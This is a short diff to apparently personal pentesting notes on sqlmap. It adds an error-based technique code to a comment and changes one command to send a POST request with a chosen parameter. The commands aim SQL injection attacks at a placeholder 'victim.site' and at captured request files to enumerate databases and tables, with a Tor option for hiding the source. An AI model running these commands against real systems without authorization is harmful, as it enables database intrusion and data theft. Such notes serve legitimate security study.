@@ -14,7 +14,7 @@ tags:
 ```bash
 sqlmap -u ‘http://victim.site/view.php?id=112’ -p id --technique=U
 # -p: to indicate an injectable parameter 
-# --technique=U  //to indicate a UNION based SQL injection technique
+# --technique=U  //to indicate a UNION based SQL injection technique // E: error based  // 
 # -b: banner of the database
 # --tor: to use a proxy to connect to the target URL
 # -v3: to see the payloads that sqlmap is using
@@ -35,7 +35,7 @@ Capture the request with burpsuite and save it to a file.
 
 ```bash
 # Get all databases
-sqlmap -r nameoffiletoinject --dbs    
+sqlmap -r nameoffiletoinject --method POST --data "parameter=lala" -p parameter --dbs    
 
 # Get all tables 
 sqlmap -r nameoffiletoinject --tables
